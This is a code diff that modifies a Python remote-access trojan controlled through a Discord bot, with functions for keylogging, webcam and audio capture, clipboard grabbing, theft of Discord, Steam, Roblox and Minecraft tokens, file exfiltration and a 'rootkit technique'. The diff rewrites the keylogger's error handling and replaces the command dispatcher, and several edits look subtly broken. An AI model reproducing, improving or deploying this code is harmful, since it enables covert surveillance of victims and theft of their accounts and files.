@@ -40,18 +40,31 @@ def send_to_discord(message):
 
 def log_keystroke(key):
     try:
-        if isinstance(key, Key):
-            key_str = str(key)
-        else:
-            key_str = key.char if hasattr(key, 'char') and key.char else str(key)
-        logging.info(key_str)
-        send_to_discord(key_str)
+        key_str = str(key).replace("'", "")
+        if "Key" not in key_str:
+            logging.info(key_str)
+            send_to_discord(key_str)
     except Exception as e:
         logging.error(f"Keylogging failed: {e}")
 
 def start_keylogger():
-    with Listener(on_press=log_keystroke) as listener:
-        listener.join()
+    def on_press(key):
+        try:
+            log_keystroke(key)
+        except Exception as e:
+            logging.error(f"Keylogger failed: {e}")
+            return False  # exit listener
+    try:
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+    except Exception as e:
+        logging.error(f"Keylogger listener error: {e}")
+
+def safe_clipboard_check():
+    try:
+        return ImageGrab.grabclipboard()
+    except Exception:
+        return None  # silently ignore clipboard errors
 
 def record_audio(duration=30):
     try:
@@ -91,7 +104,7 @@ def capture_webcam():
             filename = f"webcam_{int(time.time())}.png"
             cv2.imwrite(filename, frame)
             send_to_discord(f"Webcam photo saved as {filename}")
-        cap.release()
+            cap.release()
     except Exception as e:
         logging.error(f"Webcam capture failed: {e}")
 
@@ -118,7 +131,7 @@ def discord_dump():
         appdata = os.getenv('APPDATA')
         for root, dirs, files in os.walk(appdata):
             for file in files:
-                if file == 'Local\\Discord\\app-0.0.309\\settings.json':
+                if file == 'Local\Discord\app-0.0.309\settings.json':
                     with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                         data = f.read()
                         if 'token' in data:
@@ -171,52 +184,11 @@ def exfiltrate_files():
 
 @bot.event
 async def on_message(message):
-    if message.author == bot.user:
+    if message.author.bot:
         return
 
-    if message.content.startswith("!keylogger start"):
-        logging.info("Starting keylogger...")
-        threading.Thread(target=start_keylogger).start()
-
-    elif message.content.startswith("!record_audio"):
-        try:
-            duration = int(message.content.split(" ")[1])
-            logging.info(f"Recording audio for {duration} seconds...")
-            record_audio(duration)
-        except IndexError:
-            logging.error("Duration for audio recording not provided")
-            send_to_discord("Usage: !record_audio <duration>")
-
-    elif message.content.startswith("!screenshot"):
-        logging.info("Capturing screenshot...")
-        capture_screenshot()
-
-    elif message.content.startswith("!start_webcam"):
-        logging.info("Capturing webcam image...")
-        capture_webcam()
-
-    elif message.content.startswith("!steamdump"):
-        logging.info("Dumping Steam token...")
-        steam_dump()
-
-    elif message.content.startswith("!discorddump"):
-        logging.info("Dumping Discord token...")
-        discord_dump()
-
-    elif message.content.startswith("!robloxdump"):
-        logging.info("Dumping Roblox token...")
-        roblox_dump()
-
-    elif message.content.startswith("!minecraftdump"):
-        logging.info("Dumping Minecraft session...")
-        minecraft_dump()
-
-    elif message.content.startswith("!exfil_all"):
-        logging.info("Starting full exfiltration...")
-        exfiltrate_files()
-
-    elif message.content == "!help":
-        send_to_discord("Type !commands")
+    cmd = message.content.strip().lstrip("!")
+    asyncio.create_task(handle_command(cmd))  # send command for processing
 
 def apply_rootkit_technique():
     try:
@@ -229,4 +201,6 @@ async def setup():
     await bot.start(TOKEN)
 
 if __name__ == '__main__':
-    asyncio.run(setup())
+    loop = asyncio.get_event_loop()
+    loop.create_task(setup())
+    loop.run_forever()
